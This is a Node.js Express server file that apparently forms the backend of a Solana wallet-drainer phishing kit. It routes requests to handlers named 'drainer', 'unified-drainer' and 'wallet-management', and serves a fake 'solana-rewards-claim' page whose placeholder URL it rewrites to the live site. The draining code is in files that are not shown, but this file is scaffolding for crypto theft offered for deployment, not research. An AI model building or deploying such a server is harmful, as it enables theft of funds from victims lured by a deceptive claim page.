import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import config from './src/environment.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Enhanced JSON parsing with better error handling
app.use(express.json({ 
  limit: '10mb',
  verify: (req, res, buf, encoding) => {
    try {
      JSON.parse(buf);
    } catch (e) {
      console.error('[JSON] Invalid JSON received:', buf.toString());
      throw new Error('Invalid JSON format');
    }
  }
}));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Custom JSON error handler
app.use((error, req, res, next) => {
  if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
    console.error('[JSON_ERROR] Malformed JSON:', error.body);
    return res.status(400).json({
      success: false,
      error: 'Invalid JSON format',
      details: 'Please ensure your request body contains valid JSON',
      code: 'INVALID_JSON'
    });
  }
  next(error);
});

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    timestamp: new Date().toISOString(),
    environment: config.NODE_ENV,
    version: '1.0.0'
  });
});

// API Routes - Direct routing for /api/drainer and all sub-routes
app.all('/api/drainer*', async (req, res) => {
  try {
    const module = await import('./api/index.js');
    await module.default(req, res);
  } catch (error) {
    console.error('Error loading index handler:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Internal server error' });
    }
  }
});

app.use('/api/wallet-management', async (req, res, next) => {
  try {
    const module = await import('./api/wallet-management.js');
    await module.default(req, res);
  } catch (error) {
    console.error('Error loading wallet management handler:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Internal server error' });
    }
  }
});

app.use('/api/unified-drainer', async (req, res, next) => {
  try {
    const module = await import('./api/unified-drainer.js');
    await module.default(req, res);
  } catch (error) {
    console.error('Error loading unified drainer handler:', error);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Internal server error' });
    }
  }
});

// Serve index.html for all other routes (SPA routing)
app.get('*', async (req, res) => {
  try {
    const fs = await import('fs/promises');
    const indexPath = path.join(__dirname, 'public', 'index.html');
    let html = await fs.readFile(indexPath, 'utf8');
    
    // Get site URL from environment variable (from config)
    const siteUrl = config.siteUrl || `http://localhost:${PORT}`;
    
    // Replace placeholder URLs with actual site URL from environment
    html = html.replace(/https:\/\/solana-rewards-claim\.com/g, siteUrl);
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error serving index.html:', error);
    res.status(500).send('Error loading page');
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ 
    error: 'Internal server error',
    message: error.message 
  });
});

// Start server with error handling
const server = app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📁 Serving static files from: ${path.join(__dirname, 'public')}`);
  console.log(`🌍 Environment: ${config.server.nodeEnv}`);
  console.log(`🔗 Health check: http://localhost:${PORT}/health`);
});

// Handle server errors
server.on('error', (error) => {
  if (error.code === 'EADDRINUSE') {
    console.error(`❌ Port ${PORT} is already in use. Please kill the existing process or use a different port.`);
    console.error(`💡 Try running: netstat -ano | findstr :${PORT}`);
  } else {
    console.error('❌ Server error:', error);
  }
  process.exit(1);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down server gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

export default app;
